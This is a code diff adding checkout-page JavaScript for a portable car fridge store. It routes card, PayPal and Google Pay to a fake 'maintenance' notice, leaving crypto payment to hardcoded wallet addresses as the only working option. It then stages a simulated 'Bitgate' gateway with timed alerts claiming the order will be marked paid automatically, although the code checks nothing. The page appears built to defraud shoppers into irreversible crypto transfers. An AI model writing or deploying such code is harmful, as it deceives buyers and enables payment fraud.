+        const paymentModalOverlay = document.getElementById('paymentModalOverlay');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const modalConfirmBtnContainer = document.getElementById('modalConfirmBtnContainer');
+        const modalConfirmBtn = document.getElementById('modalConfirmBtn');
+        const paymentRadios = document.querySelectorAll('input[name="modal-payment"]');
+        const pageCardRadio = document.getElementById('pageCardRadio');
+        
+        const cardModalOverlay = document.getElementById('cardModalOverlay');
+        const closeCardModalBtn = document.getElementById('closeCardModalBtn');
+
+        const maintenanceModalOverlay = document.getElementById('maintenanceModalOverlay');
+        const closeMaintenanceModalBtn = document.getElementById('closeMaintenanceModalBtn');
+
+        const cryptoModalOverlay = document.getElementById('cryptoModalOverlay');
+        const closeCryptoModalBtn = document.getElementById('closeCryptoModalBtn');
+        const copyAddressBtn = document.getElementById('copyAddressBtn');
+        const copyToast = document.getElementById('copyToast');
+        const paidBtn = document.getElementById('paidBtn');
+        const pageCryptoRadios = document.querySelectorAll('.page-crypto-radio');
+
+        const cryptoData = {
+            'usdt-trc20': { name: 'USDT (TRC20)', address: 'TMXrWSAiGfZv1F9QzHp9q3hpwf4qQ7ZyzA', symbol: 'USDT' },
+            'usdt-bep20': { name: 'USDT (BEP20)', address: '0x2C2F81B73670cEc902915A42C153Cd3f5EfB6431', symbol: 'USDT' },
+            'usdt-erc20': { name: 'USDT (ERC20)', address: '0x2C2F81B73670cEc902915A42C153Cd3f5EfB6431', symbol: 'USDT' },
+            'btc': { name: 'BTC', address: 'bc1py2xwlzftvl9709kl3ah42ql5ykzyuys2fxs8k2xttplwel7npl7q8w0ut6', symbol: 'BTC' },
+            'eth': { name: 'ETH', address: '0x2C2F81B73670cEc902915A42C153Cd3f5EfB6431', symbol: 'ETH' },
+            'usdc': { name: 'USDC', address: '0x2C2F81B73670cEc902915A42C153Cd3f5EfB6431', symbol: 'USDC' }
+        };
+
+        const maintenanceMethods = ['paypal', 'card', 'googlepay'];
+
+        // Show maintenance modal
+        const showMaintenance = () => {
+            maintenanceModalOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        };
+
+        window.closeMaintenanceModal = () => {
+            maintenanceModalOverlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        };
+
+        closeMaintenanceModalBtn.addEventListener('click', closeMaintenanceModal);
+
+        // Open crypto modal from page-level radios
+        pageCryptoRadios.forEach(radio => {
+            radio.addEventListener('change', () => {
+                if (radio.checked && cryptoData[radio.value]) {
+                    const data = cryptoData[radio.value];
+                    document.getElementById('cryptoName').textContent = data.name;
+                    document.getElementById('cryptoAddress').textContent = data.address;
+                    document.getElementById('cryptoSymbolDisplay').textContent = data.symbol;
+                    document.getElementById('cryptoWarningSymbol').textContent = data.symbol;
+                    document.getElementById('cryptoQR').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${data.address}`;
+                    
+                    cryptoModalOverlay.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    radio.checked = false; // Reset for re-triggering
+                }
+            });
+        });
+
+        // Open card modal from page-level radio
+        pageCardRadio.addEventListener('change', () => {
+            if (pageCardRadio.checked) {
+                showMaintenance();
+                pageCardRadio.checked = false;
+            }
+        });
+
+        // Page-level other methods (PayPal, Google Pay)
+        document.querySelectorAll('input[name="payment"]').forEach(radio => {
+            if (radio.id !== 'pageCardRadio' && !radio.classList.contains('page-crypto-radio')) {
+                radio.addEventListener('change', () => {
+                    // Logic to check value. Since they don't have explicit values on page, 
+                    // we check based on text or just show maintenance for all except crypto/clearpay
+                    const parent = radio.closest('label');
+                    const text = parent.textContent.toLowerCase();
+                    if (text.includes('paypal') || text.includes('google pay')) {
+                        showMaintenance();
+                        radio.checked = false;
+                    }
+                });
+            }
+        });
+
+        // Open payment modal
+        placeOrderBtn.addEventListener('click', () => {
+            paymentModalOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        });
+
+        // Close payment modal
+        const closeModal = () => {
+            paymentModalOverlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+            modalConfirmBtnContainer.classList.remove('active');
+            paymentRadios.forEach(radio => radio.checked = false);
+        };
+
+        closeModalBtn.addEventListener('click', closeModal);
+
+        // Handle payment selection in first modal
+        const updateSelection = () => {
+            const anyChecked = Array.from(paymentRadios).some(radio => radio.checked);
+            if (anyChecked) {
+                modalConfirmBtnContainer.classList.add('active');
+            }
+        };
+
+        // Re-query in case list expanded
+        document.querySelectorAll('input[name="modal-payment"]').forEach(radio => {
+            radio.addEventListener('change', updateSelection);
+        });
+
+        // Helper function to save order to backend
+        async function saveOrder(method) {
+            try {
+                const response = await fetch('/api/orders', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        customerName: 'Guest Customer',
+                        totalAmount: 330833.25, // Example amount
+                        paymentMethod: method,
+                        status: 'Pending',
+                        items: '4L/6L/8L Portable Car Fridge'
+                    })
+                });
+                if (response.ok) console.log('Order saved successfully');
+            } catch (e) {
+                console.error('Failed to save order:', e);
+            }
+        }
+
+        // Handle 'Confirm' button click
+        modalConfirmBtn.addEventListener('click', () => {
+            const selected = document.querySelector('input[name="modal-payment"]:checked');
+            if (!selected) return;
+
+            const method = selected.value;
+            saveOrder(method); // Save order when confirmed in modal
+
+            if (maintenanceMethods.includes(method)) {
+                paymentModalOverlay.classList.remove('active');
+                showMaintenance();
+            } else if (selected.value === 'card') {
+                // (Redundant check but kept for logic clarity)
+                paymentModalOverlay.classList.remove('active');
+                showMaintenance();
+            } else if (cryptoData[selected.value]) {
+                const data = cryptoData[selected.value];
+                document.getElementById('cryptoName').textContent = data.name;
+                document.getElementById('cryptoAddress').textContent = data.address;
+                document.getElementById('cryptoSymbolDisplay').textContent = data.symbol;
+                document.getElementById('cryptoWarningSymbol').textContent = data.symbol;
+                document.getElementById('cryptoQR').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${data.address}`;
+                
+                paymentModalOverlay.classList.remove('active');
+                cryptoModalOverlay.classList.add('active');
+            } else {
+                closeModal();
+            }
+        });
+
+        // Close crypto modal
+        const closeCryptoModal = () => {
+            cryptoModalOverlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        };
+
+        closeCryptoModalBtn.addEventListener('click', closeCryptoModal);
+
+        // Copy Address functionality
+        copyAddressBtn.addEventListener('click', () => {
+            const address = document.getElementById('cryptoAddress').textContent;
+            navigator.clipboard.writeText(address).then(() => {
+                copyToast.classList.add('active');
+                setTimeout(() => copyToast.classList.remove('active'), 2000);
+            });
+        });
+
+        // Paid button interaction (Bitgate Gateway Simulation)
+        paidBtn.addEventListener('click', () => {
+            paidBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Connecting to Bitgate...';
+            paidBtn.style.pointerEvents = 'none';
+            paidBtn.style.opacity = '0.7';
+
+            setTimeout(() => {
+                paidBtn.innerHTML = '<i class="fas fa-lock"></i> Processing via Bitgate Secure...';
+                
+                setTimeout(() => {
+                    alert('Redirecting to Bitgate Payment Gateway for secure blockchain verification. Please do not close this window.');
+                    // In a real scenario, this would be: window.location.href = 'https://gateway.bitgate.com/pay/' + orderId;
+                    
+                    setTimeout(() => {
+                        alert('Your Bitgate payment request has been initialized. Once the transaction is detected on the blockchain, your order will be marked as paid automatically.');
+                        closeCryptoModal();
+                        paidBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Proceed via Bitgate Secure';
+                        paidBtn.style.pointerEvents = 'auto';
+                        paidBtn.style.opacity = '1';
+                    }, 1000);
+                }, 1500);
+            }, 1500);
+        });
+
+        // Close card modal
+        const closeCardModal = () => {
+            cardModalOverlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        };
+
+        closeCardModalBtn.addEventListener('click', closeCardModal);
+
+        // Close on overlay click
+        paymentModalOverlay.addEventListener('click', (e) => {
+            if (e.target === paymentModalOverlay) closeModal();
+        });
+        cardModalOverlay.addEventListener('click', (e) => {
+            if (e.target === cardModalOverlay) closeCardModal();
+        });
+    </script>
+</body>
+</html>
